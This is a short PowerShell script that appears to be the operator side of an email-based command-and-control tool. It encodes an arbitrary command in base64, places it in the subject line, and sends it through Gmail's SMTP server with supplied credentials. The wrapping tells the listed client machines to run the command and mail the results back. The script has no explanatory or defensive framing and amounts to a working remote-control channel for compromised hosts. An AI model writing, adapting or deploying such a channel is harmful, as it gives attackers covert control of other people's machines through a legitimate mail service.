
[CmdletBinding()]
Param(
[Parameter(Mandatory=$True)]
[string]$EmailAddress,
[Parameter(Mandatory=$True)]
[string]$password,
[Parameter(Mandatory=$True)]
[string]$ClientList,
[Parameter(Mandatory=$True)]
[string]$Command
)
$username = $EmailAddress
Function Send-Command(){
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$to = $username
$from = $username
$subject = $command
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($subject)
$EncodedText =[Convert]::ToBase64String($Bytes)
$subject = $EncodedText
$body = $message|out-string
$smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
$smtp.EnableSSL = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password);
$smtp.send($from, $to, $subject, $body)
}

$command = "'" + '$var' + '= ' + $command + ';send-command ' + '$var' + ' ~' + $ClientList + "'"
send-command $command